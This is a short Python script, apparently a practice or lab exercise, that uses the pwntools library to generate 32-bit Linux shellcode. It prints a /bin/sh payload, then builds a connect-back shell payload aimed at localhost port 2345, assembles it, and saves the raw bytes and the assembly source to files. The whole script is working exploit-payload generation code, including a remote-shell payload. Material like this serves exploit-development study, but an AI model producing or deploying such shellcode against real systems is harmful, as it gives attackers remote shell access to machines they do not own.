from pwn import *

shellcode = shellcraft.i386.linux.sh()
print(shellcode)
#p = run_assembly(shellcode)

''' reverse shellcode '''

assembly = shellcraft.i386.linux.connect('localhost',2345,'ipv4')
assembly += shellcraft.i386.linux.findpeersh(2345)

#print(assembly)

hex_code = asm(assembly)
#print(hex_code)

with open('rs_hex','wb') as f:
    f.write(hex_code)

with open('rs_asm','w') as f:
    f.write(assembly)